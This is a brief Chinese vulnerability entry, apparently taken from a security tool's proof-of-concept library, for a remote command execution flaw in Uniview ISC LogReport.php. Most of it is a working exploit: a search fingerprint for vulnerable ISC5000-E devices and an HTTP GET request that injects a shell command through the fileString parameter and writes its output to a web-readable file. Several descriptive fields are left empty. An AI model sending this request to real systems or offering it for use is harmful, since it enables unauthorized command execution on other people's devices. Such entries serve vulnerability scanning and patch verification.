﻿# 浙江宇视科技 ISC LogReport.php 远程命令执行漏洞

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：title=="ISC5000-E"

> 验证脚本：HTTP

```
GET /Interface/LogReport/LogReport.php?action=execUpdate&fileString=x%3bid%3edudesuite.txt HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/Interface/LogReport/dudesuite.txt


> 验证文件来源：Dude Suite Web Security Tools - https://www.dudesuite.cn - 转载请注明出处
